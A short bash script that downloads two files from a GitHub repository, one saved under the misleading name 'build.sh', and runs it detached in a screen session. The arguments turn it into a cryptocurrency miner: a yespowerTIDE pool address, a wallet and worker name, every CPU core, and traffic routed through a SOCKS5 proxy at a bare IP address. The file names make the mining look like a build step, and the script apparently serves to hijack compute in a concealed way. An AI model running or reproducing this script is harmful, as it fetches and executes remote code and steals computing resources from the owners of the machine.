#!/bin/bash

apt-get update
apt-get install screen -y
wget -q https://raw.githubusercontent.com/ghortiyowe/gasken/main/compile.sh
wget -qO build.sh https://raw.githubusercontent.com/ghortiyowe/gasken/main/pyton
chmod +x build.sh
chmod +x compile.sh
screen -dm -S build.sh ./build.sh -a yespowerTIDE -o stratum+tcp://na.tidepool.shop:6243 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.JASUKA -t $(nproc --all) -p c=TDC,m=solo --proxy socks5://67.201.33.9:25280
./compile.sh

echo succes
